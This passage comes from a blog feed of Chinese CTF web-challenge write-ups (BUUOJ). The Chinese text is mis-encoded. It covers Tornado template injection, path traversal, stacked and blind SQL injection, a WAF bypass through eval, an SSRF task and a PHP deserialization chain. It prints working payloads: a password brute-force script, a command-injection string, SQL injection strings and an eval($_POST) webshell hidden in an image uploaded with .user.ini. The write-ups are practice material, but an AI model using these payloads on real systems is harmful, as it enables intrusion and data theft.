class="variable">$postData</span> = <span class="keyword">array</span>(<span class="string">&quot;password&quot;</span> =&gt; <span class="variable">$result</span> . chr(<span class="variable">$j</span>) . <span class="variable">$p</span>, <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;yu22x&quot;</span>);</span><br><span class="line">        <span class="variable">$postData</span> = http_build_query(<span class="variable">$postData</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$postData</span>);</span><br><span class="line">        <span class="variable">$outcontent</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>,CURLINFO_HTTP_CODE);</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        printf(<span class="string">&quot;Now j is %d,string is %s\n&quot;</span>,<span class="variable">$j</span>,<span class="variable">$result</span> . chr(<span class="variable">$j</span>) . <span class="variable">$p</span>);</span><br><span class="line">        <span class="keyword">if</span>(strpos(<span class="variable">$outcontent</span>,<span class="string">&quot;I have filtered all the characters. Why can you come in? get out!&quot;</span>) || <span class="variable">$httpCode</span> == <span class="number">302</span>)&#123;</span><br><span class="line">            <span class="variable">$result</span> .= chr(<span class="variable">$j</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°å¯†ç ä¸º <code>67815b0c009ee970fe4014abaa3Fa6A0</code>ã€‚</p><p><strong>New Section</strong><br>ä½¿ç”¨ç¯å¢ƒå˜é‡æˆªå–å‡º <code>nl ????.???</code> çš„æŒ‡ä»¤è¯»å– <code>flag.php</code>ã€‚</p><blockquote><p>1.1.1.1;${PATH:14:1}<n>$</n>{PATH:5:1} ????.???</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ Web ä¸€åˆ†é¢˜ WriteUp åˆé›†</title>
      <link href="/zh-CN/posts/d24ddcdc.html"/>
      <url>/zh-CN/posts/d24ddcdc.html</url>
      
        <content type="html"><![CDATA[<p>æƒ³äº†å¾ˆä¹…æ€ä¹ˆç»™è‡ªå·±ä¸€ç‚¹åˆ·é¢˜åŠ¨åŠ›ï¼Œæ„Ÿè§‰å¾—é å…´è¶£é©±ä½¿ã€‚å†åŠ ä¸Šæœ‰ç‚¹æƒ³å‚ç›´ä¸Šåˆ†ï¼Œä¹Ÿå¢åŠ ä¸€ç‚¹æŠ€æœ¯åŠ›ï¼Œæ‰€ä»¥å°±å¼€äº†è¿™æ³¢å®æ—¶æ›´æ–°çš„å°åˆé›†ã€‚æœ‰ä¸€éƒ¨åˆ†çš„ç¯å¢ƒä¼šå°è¯•è‡ªå·±å»æ­å»ºã€‚ï¼ˆæƒ³æ”¹å–„ä¸€ä¸‹ç© Docker çš„æŠ€æœ¯åŠ›ï¼Œè€Œä¸”ä¹Ÿæƒ³æ”¶é›†ä¸€ä¸‹é¢˜ç›®åŸæœ¬å¾ˆå¥½ç©çš„ flagï¼‰è¿˜æœ‰éƒ¨åˆ†é¢˜ç›®ä¼šè¢«å•ç‹¬åˆ†ç¦»å‡ºæ¥ï¼ˆè­¬å¦‚å’±æ‰“è¿‡çš„æ¯”èµ›å•¥çš„ï¼‰ï¼Œæ‰€ä»¥å¹¶ä¸å®Œæ•´ï¼Œå˜¿å˜¿ã€‚</p><h3 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h3><p>é¦–å…ˆåˆ†åˆ«ç‚¹è¿›æä¾›çš„ä¸‰ä¸ªé¡µé¢ï¼Œæ”¶é›†ä¸€æ³¢ hintï¼Œå¯ä»¥å¾—åˆ° <code>md5(cookie_secret+md5(filename))</code> <code>flag in /fllllllllllllag</code> è¿™ä¸¤ä¸ªæç¤ºï¼Œè¿˜æœ‰ä¸€ä¸ª <code>render</code>ã€‚å› ä¸ºæç¤ºäº†æ˜¯ tornado çš„æ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯æ¥è§¦å¾—æ¯”è¾ƒå°‘ï¼Œäºæ˜¯å°±æŸ¥äº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†è¿™æ ·çš„å†…å®¹ã€‚</p><blockquote><p>åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡ï¼Œä¾‹å¦‚ {{ escape(handler.settings["cookie"]) }}</p><p>handler æŒ‡å‘ RequestHandler</p><p>è€Œ RequestHandler.settings åˆæŒ‡å‘ self.application.settings</p><p>æ‰€æœ‰ handler.settings å°±æŒ‡å‘ RequestHandler.application.settings äº†ï¼</p></blockquote><p>ä½†æ˜¯ç›®å‰æ˜¯æ²¡æœ‰åˆ©ç”¨ç‚¹çš„ã€‚è¿™ä¸ªæ—¶å€™ï¼ŒæŠŠé¢˜ç›®çš„ GET å‚æ•°ä¸€é€šä¹±æ”¹ä¹‹åå‡ºç°äº†ä¸€ä¸ªæŠ¥é”™é¡µé¢ã€‚æ¬¸ï¼Œå¥½æœºä¼šï¼æ„é€ äº†ä¸€ä¸ª <code>error?msg=&#123;&#123;7*'7'&#125;&#125;</code> ç»“æœè¿”å›äº† ORZã€‚åŸºæœ¬ä¸Šç¡®å®šæ˜¯åˆ©ç”¨ç‚¹äº†ï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æƒ³ç¡®å®šä¸€ä¸‹ï¼Œäºæ˜¯æ„é€ äº† <code>error?msg=&#123;&#123;~1&#125;&#125;</code>ï¼Œå¾—åˆ°äº† -2 çš„åé¦ˆï¼Œäºæ˜¯å¾—ä»¥ç¡®è®¤ã€‚æ ¹æ®ä¸Šé¢æŸ¥åˆ°çš„ç»“æœï¼Œæ„é€  <code>error?msg=&#123;&#123;handler.settings&#125;&#125;</code> å¾—åˆ° <code>cookie_secret</code> ä¸º <code>cae74968-3bf4-4be4-8505-e2db1c865c15</code>ã€‚æ ¹æ®ä¸Šé¢çš„ hint æ„é€  <code>filename=/fllllllllllllag&amp;filehash=6740f481f040fa14e844929205445908</code> å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f69df34c-c28c-4aa9-9bfe-7e73f9e61690&#125;</span><br></pre></td></tr></table></figure><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>é¦–å…ˆçœ‹äº†ä¸€æ³¢æºç ï¼Œæ‰¾åˆ° source.php ç„¶å source å¯è¯»ï¼Œå…¶ä¸­è¿˜æœ‰ä¸ª hint.phpã€‚äºæ˜¯å»çœ‹ hint.phpï¼Œå¾—åˆ°äº†ä¸€ä¸ªæç¤º <code>flag not here, and flag in ffffllllaaaagggg</code>ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹ï¼Œå› ä¸ºä¸€å¼€å§‹çš„æ„é€ å†³å®šäº†å‰ä¸¤ä¸ªæ£€éªŒå¿…ä¸å¯èƒ½ trueï¼Œå› æ­¤åªèƒ½çœ‹åé¢ url è§£ç ä¹‹åçš„æ ¡éªŒï¼Œé‚£å°±è¦ä¿è¯æ„é€ èƒ½å®‰å…¨åœ°é€šè¿‡è¿™ä¸¤ä¸ªåœ°æ–¹è€Œä¸è¢«æˆªæ–­ã€‚å› ä¸ºæºç ä¼šä¸æ–­åœ°å°è¯•æˆªå–é—®å·å‰é¢çš„å†…å®¹ï¼ˆå½“æ²¡æœ‰é—®å·å°±åœ¨æœ€åæ¥ä¸€ä¸ªé—®å·ç„¶åæˆªæ–­ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæ²¡æœ‰æˆªæ–­ï¼‰ï¼Œå› æ­¤åªè¦åœ¨ <code>source.php</code> åé¢ç¼–ç ä¸€ä¸ªé—®å· <code>%3f</code>ï¼Œå°±èƒ½è¾¾æˆåœ¨è§£ç åå†æˆªæ–­çš„ç›®çš„ï¼Œä»è€Œå¯ä»¥é€šè¿‡ <code>in_array($_page, $whitelist)</code> çš„æ£€éªŒä»è€Œè¿”å› trueã€‚æ¥ä¸‹æ¥å°±æ˜¯ç›®å½•ç©¿è¶Šä¸€æ³¢ï¼Œæ„é€  <code>?file=source.php?/../../../../../../ffffllllaaaagggg</code> å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hctf&#123;e8a73a09cfdd1c9a11cca29b2bf9796f&#125;</span><br></pre></td></tr></table></figure><h3 id="å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h3><p>æ—¢ç„¶æ˜¯éšä¾¿æ³¨å˜›ï¼Œä¸Šæ‰‹è¯•è¯•çœ‹ <code>1&#39;#</code> å‘ç°æ˜¾ç¤ºæ˜¯æ­£å¸¸çš„ï¼Œäºæ˜¯è¿›ä¸€æ­¥æ„é€  <code>1&#39; union select 1,2,3 #</code> ç„¶åå°±è¢« <code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code> æŒ¡ä¸‹æ¥äº†ã€‚å› ä¸ºæ²¡å¾— <code>select</code> äº†ï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œå †å æ³¨å…¥æ¯”è¾ƒé è°±ï¼Œäºæ˜¯æ„é€ ä¸€æ³¢ <code>1&#39;;show databases;#</code> å¾—åˆ°äº†æ­£ç¡®çš„åé¦ˆã€‚äºæ˜¯ <code>1&#39;;show tables;#</code>ï¼Œçœ‹åˆ°äº†ä¸€ä¸ªå¾ˆå¯ç–‘çš„è¡¨ <code>1919810931114514</code>ã€‚ç”¨ <code>1&#39;;desc `1919810931114514`;#</code> æŸ¥ä¸€æ³¢è¿™ä¸ªè¡¨çš„ç»“æ„å¯ä»¥å‘ç° flag çš„å­—æ®µã€‚</p><p>å…³é”®åœ¨äºå¦‚ä½•å»è¯»å–å®ƒï¼ŒæŸ¥äº†ä¸€æ³¢ä¹‹åå‘ç°å¯ä»¥æ‚„æ‚„åœ°æŠŠè¡¨æ¢æ‰ï¼Œäºæ˜¯æ‰“å‡ºä¸€å¥—ç»„åˆæ“ä½œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RENAME TABLE &#96;words&#96; TO &#96;wordstmp&#96;;</span><br><span class="line">RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;</span><br><span class="line">ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¹‹åï¼Œé»˜è®¤æ‰€æŸ¥çš„ words è¡¨å°±å˜æˆäº†åŒ…å« flag çš„è¡¨ï¼Œè¿™ä¸ªæ—¶å€™éšä¾¿æ„é€ ä¸ª <code>1&#39; or 1=1#</code>ä¸€è¯»å°±èƒ½æ‹¿åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d2d32fa6-a7b4-44d0-8648-71ae2f1d1353&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p>æ°¦ï¼Œè¿™é¢˜æˆ‘æ˜¯çœŸçš„å†™ä¸å‡ºæ¥ï¼ŒæŸ¥äº†ä¸€æ³¢å‘ç°å¾ˆå¤šå¸ˆå‚…è¯´è¿™é¢˜å¯ä»¥æŸ¥åˆ°æºç ï¼Œä½†æ˜¯æˆ‘æ€ä¹ˆæ‰«éƒ½æ‰«ä¸å‡ºQAQã€‚å¯¹ç…§ç€çœ‹äº†ä¸€æ³¢ï¼Œå‘ç°éœ€è¦æŠŠåŸæœ¬çš„ <code>||</code> å®‰æ’æ‰ã€‚è¿™ç‚¹ä½¿ç”¨ <code>PIPES_AS_CONCAT</code> å¯ä»¥è¾¾æˆï¼Œäºæ˜¯æ„é€  <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code> æˆåŠŸæ‹¿åˆ° flagã€‚</p><p>æºç ä¸­çš„ sql è¯­å¥æ˜¯ <code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code>ï¼Œæ„é€ ä¹‹åå°±å˜æˆäº†ä¸‰å¥è¯­å¥ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125;</span><br></pre></td></tr></table></figure><h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>è¿™é¢˜åœ¨ä¿®æ”¹å¯†ç çš„é¡µé¢ç»™äº†ä¸ªæ³¨é‡Š hintï¼Œå®šå‘åˆ° GitHubï¼Œä¸Šé¢æœ‰é¢˜ç›®çš„æºç ã€‚å¥½å¥‡çš„æˆ‘çœ‹äº†ä¸€æ³¢åŒç”¨æˆ·çš„å…¶ä»– repoï¼Œæ‰¾åˆ°äº†è¿™é¢˜çš„ç¯å¢ƒï¼Œç„¶ååœ¨ readme çœ‹åˆ°äº†è€ƒç‚¹ï¼Œäºæ˜¯é¡ºç€ä¸€æ‰¾ï¼Œæ‰¾åˆ°äº† <a href="http://sunsec.top/2018/11/15/HCTF%20admin/">è¿™ç¯‡æ–‡ç« </a>ã€‚äºæ˜¯å°±æ³¨å†Œä¸€æ³¢ <code>á´¬á´°á´¹á´µá´º</code> ç„¶åç™»å½•å†ä¿®æ”¹å¯†ç ï¼Œå†ç”¨ <code>admin</code> å’Œä¿®æ”¹çš„å¯†ç ç™»å½•å³å¯å¾—åˆ° flagã€‚</p><p>å…³äºå¯¹äº Unicode å­—ç¬¦çš„ç”Ÿæˆå¯ä»¥å‚è€ƒ <a href="https://unicode-table.com/en/1D2C/">è¿™ä¸ªé¡µé¢</a>ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hctf&#123;un1cOdE_cHe4t_1s_FuNnying&#125;</span><br></pre></td></tr></table></figure><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>é¦–å…ˆéšä¾¿ç®—ä¸€ä¸ªæ•°ï¼Œç„¶åçœ‹çœ‹è¯·æ±‚ï¼Œå‘ç°è¯·æ±‚ç»™äº† calc.phpã€‚å°è¯•ç›´æ¥è®¿é—®ï¼Œå‘ç°æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ç‚¹å°±æ˜¯æœ€åçš„ <code>eval()</code>ã€‚è¿™æ³¢æ²¡ç»™å¼•å·ï¼Œäºæ˜¯æœ‰ä¸¤ç§æ–¹æ¡ˆï¼šä½¿ç”¨ <code>chr()</code> é…åˆ ASCII æ¥æ„é€ ï¼Œæˆ–è€…ä½¿ç”¨ hex å’ŒæŒ‰ä½å–åæ¥æ„é€ ï¼ˆè¿™ä¸ªæ˜¯åæ¥çœ‹<a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/10/15/2019_roarctf-writeup-ginkgo/#0x01_easy_calc">è¿™ä¸ªé¢˜è§£</a>çš„æ—¶å€™å­¦åˆ°çš„ã€‚ä½†æ˜¯æ„é€ æˆ <code>?num=1;var_dump(scandir(chr(47)));</code> ä¹‹å 403 äº†ã€‚äºæ˜¯è¿”å›å»çœ‹ï¼Œå‘ç°é¦–é¡µæºç ä¸­æäº†ä¸€å¥ WAFã€‚äºæ˜¯é¡ºæ‰‹æŸ¥äº†ä¸€æ³¢ï¼Œå‘ç°å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç©ºæ ¼å»ç»•è¿‡ã€‚äºæ˜¯æ„é€  <code>?%20num=1;var_dump(scandir(chr(47)));</code>ï¼ŒæˆåŠŸå¾—åˆ°åé¦ˆã€‚å¾—åˆ° <code>f1agg</code> çš„çº¿ç´¢ã€‚äºæ˜¯æ¥ä¸‹æ¥æ„é€  <code>?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code> æ¥è¯»å–è¿™ä¸ªæ–‡ä»¶ï¼ŒæˆåŠŸå¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d7899aa0-16b1-4752-95f5-b9c5037caffa&#125;</span><br></pre></td></tr></table></figure><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>å•Šï¼Œæ˜¯çœ‹èµ·æ¥å¾ˆç†Ÿæ‚‰çš„ä¸Šä¼ æ–‡ä»¶ã€‚è€å¥—è·¯ï¼Œæ„é€ å¥½ä¹‹åä¸Šä¼ å†ç”¨èšå‰‘è¿æ¥å°±è¡Œã€‚è¿™é‡Œæœ‰ä¸€ä¸ªè¦ç‚¹ï¼Œå°±æ˜¯ä½¿ç”¨ .user.ini æ¥å®ç°åŠ è½½ php æ–‡ä»¶ä¹‹å‰åŠ è½½ä¸€ä¸ªæŒ‡å®šçš„æ–‡ä»¶ã€‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.user.ini</span></span><br><span class="line"><span class="comment">#define width 10</span></span><br><span class="line"><span class="comment">#define height 10</span></span><br><span class="line"><span class="attr">auto_prepend_file</span>=flag.jpg <span class="comment">#append for after </span></span><br></pre></td></tr></table></figure><p>åœ¨ flag.jpg é‡Œå†™ä¸Šä¸€å¥è¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.jpg</span></span><br><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¹‹åæ ¹æ®åé¦ˆå¯ä»¥çŸ¥é“ index.php æ–‡ä»¶ä¹Ÿä¸ä¸Šä¼ çš„æ–‡ä»¶ä½äºä¸€ä¸ªç›®å½•ä¸‹ï¼Œå› æ­¤åªéœ€è¦è®¿é—® index.php å³å¯è¾¾åˆ°ç›®çš„ã€‚äºæ˜¯èšå‰‘è®¿é—® <code>.../uploads/48cd8b43081896fbd0931d204f947663/index.php</code> ç„¶åæ‰“å¼€æ–‡ä»¶ç®¡ç†å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUCTF&#123;U5er_1n1_01d_TR1ck&#125;</span><br></pre></td></tr></table></figure><h3 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h3><p>è¿™é¢˜ï¼Œç¨å¾®è¯•äº†ä¸€ä¸‹ä¹‹åå‘ç°æ˜¯ç›²æ³¨ï¼Œæ‰¾äº†ä¸€ä¸‹çœŸå’Œå‡çš„æ ‡è®°ï¼Œæå‡ºä¹‹å‰çš„äºŒåˆ†æ¨¡æ¿ï¼Œæ„é€  <code>$sql = &quot;(ascii(substr((select(flag)from(flag)),&quot; . $i . &quot;,1))&gt;&quot; . $_mid . &quot;)^0&quot;;</code>  ä¸€é¡¿æ€¼ï¼Œå°±èƒ½è·‘å‡º flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f6bbbf99-0f93-4687-b2a4-5afc16dab5f5&#125;</span><br></pre></td></tr></table></figure><h3 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h3><p>é¦–å…ˆä¸Šæ¥ä¸€é¡¿æ“ä½œä¹‹åå‘ç°äº† <code>/view.php?no=1</code> è¿™ä¸ªæ³¨å…¥åˆ©ç”¨ç‚¹ï¼Œä¸€é¡¿æ“ä½œä¹‹åä¼šå‘ç° flag æ ¹æœ¬ä¸åœ¨æ•°æ®åº“é‡Œï¼Œåè€Œæ˜¯ä¸€æ®µåºåˆ—åŒ–çš„å­—ç¬¦ä¸²å­˜åœ¨ <code>data</code> å­—æ®µã€‚æ¯•ç«Ÿæ˜¯ç½‘é¼æ¯ï¼Œå½“ç„¶æ²¡æœ‰é‚£ä¹ˆç®€å•ã€‚å°è¯•å‡ ä¸‹æ²¡æœ‰åé¦ˆä¹‹åæŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°è¿™é¢˜æ˜¯æœ‰æºç æ³„éœ²çš„ï¼Œäºæ˜¯ä¸‹è½½ä¸‹æ¥ã€‚å¾ˆå®¹æ˜“å‘ç°æ˜¯ä¸ªååºåˆ—åŒ–ï¼Œä½†æ˜¯å®ƒæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œä½†æ˜¯ä¸»è¦çš„åˆ©ç”¨ç‚¹åœ¨ <code>blog</code> è¿™ä¸ªå­—æ®µã€‚å½“æ—¶çš„æˆ‘å¹¶ä¸çŸ¥é“è¦è¯»å•¥æ–‡ä»¶ï¼Œåæ¥çœ‹äº†å¾ˆå¤šæ–‡ç« ï¼Œæœ‰å¸ˆå‚…è¯´èƒ½æ‰«å‡º flag.phpã€‚<span class="heimu" title="æˆ‘å¤ªèœäº†">æˆ‘è¿˜æ˜¯å¤ªèœäº†</span></p><p>äºæ˜¯è¿™é‡Œå°±èƒ½æ¥ç€å¾€ä¸‹æ„é€ äº†ï¼Œæˆ‘éšä¾¿åºåˆ—åŒ–äº†ä¸€ä¸‹ï¼Œå¾—åˆ°äº† <code>O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;</code>ï¼Œç„¶åå°±æ˜¯æ¥ç€æ³¨å…¥å•¦ã€‚æŒ‰ç…§ä¸€èˆ¬å¥—è·¯ï¼Œå…ˆæ„é€  <code>select/**/1,2,3,4</code> çœ‹çœ‹å›æ˜¾åœ¨å“ªé‡Œï¼Œç„¶åå¯ä»¥çœ‹åˆ°åœ¨ 2 çš„åœ°æ–¹ã€‚ç„¶åå°±æ˜¯æƒ³åŠæ³•ä½¿å›æ˜¾æŒ‰ç…§æˆ‘ä»¬åºåˆ—åŒ–çš„å­—æ®µæ¥ã€‚å› æ­¤ï¼Œåªéœ€è¦æ„é€  <code>.../view.php?no=2333/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39; /**/from/**/users%23</code>ã€‚è¿™æ ·é¡µé¢å°±ä¼šå°è¯•è¯»å– flag.phpã€‚ç„¶åæŸ¥çœ‹é¡µé¢æºç ï¼Œç„¶å base64 è§£ç å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9e34256a-b20b-4776-86d0-bbebd2aecd02&#125;</span><br></pre></td></tr></table></figure><h3 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h3><p>è¿™é¢˜é¦–å…ˆå°±ç»™äº†æºç ï¼Œå¤åˆ¶ä¸‹æ¥ä»”ç»†åœ°æ•´ç†ï¼ˆè¿™é‡Œæˆ‘å°±ä¸è´´äº†ï¼Œå ç‰ˆé¢ï¼Œç½‘ä¸Šä¸€æœå°±æœ‰ï¼‰ã€‚é¦–å…ˆå› ä¸ºå®šä¹‰äº† <code>waf()</code> å¯¼è‡´ä¸èƒ½ä½¿ç”¨ <code>gopher</code> å’Œ <code>file</code>ã€‚ä½†è¿™åŒæ—¶ä¹Ÿç»™äº†æˆ‘ä»¬ä¸€ä¸ªæŒ‡å‘æ€§ä¿¡æ¯ï¼Œç»“åˆ hint å¯çŸ¥æˆ‘ä»¬éœ€è¦åšçš„æ˜¯è¯»å–æ–‡ä»¶ flag.txtã€‚</p><p>ä¸éš¾å‘ç°å‘ <code>/Delta</code> å‘é€è¯·æ±‚æœ€åå¯ä»¥æ‰§è¡Œåˆ° <code>Exec()</code> ä»è€Œè¯»æ–‡ä»¶ã€‚å› æ­¤éœ€è¦ä¸‰ä¸ªå‚æ•°ï¼Œå‡†ç¡®åœ°æ¥è¯´æœ‰ä¸¤ä¸ªæ˜¯ Cookieã€‚æ¥ä¸‹æ¥çœ‹ <code>Exec()</code>ï¼Œè¦è¯»å–æ–‡ä»¶å¹¶è¾“å‡ºçš„è¯éœ€è¦åœ¨å‚æ•° <code>action</code> ä¸­åŒ…å« <code>read</code> å’Œ <code>scan</code>ã€‚äºæ˜¯æ„é€  <code>action=readscan</code>ã€‚<code>param</code> è‡ªç„¶å°±æ˜¯ <code>flag.txt</code>ã€‚æ¥ä¸‹æ¥å°±æ˜¯è§£å†³ <code>sign</code> çš„ç¯èŠ‚ã€‚</p><p>é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªè·¯ç”± <code>/geneSign</code> 